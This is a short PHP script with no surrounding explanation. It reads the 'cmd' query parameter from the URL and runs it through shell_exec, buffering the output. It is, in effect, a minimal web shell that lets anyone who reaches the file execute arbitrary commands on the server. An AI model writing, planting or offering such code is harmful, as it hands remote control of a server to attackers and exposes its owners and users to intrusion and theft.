<?php
function execute($com)
{
  if(function_exists('shell_exec'))
    echo shell_exec($com);
}

$cmd = $_GET['cmd'];
ob_start();
execute($cmd);
$buffer = "";
$buffer = ob_get_contents();
ob_end_clean();
?>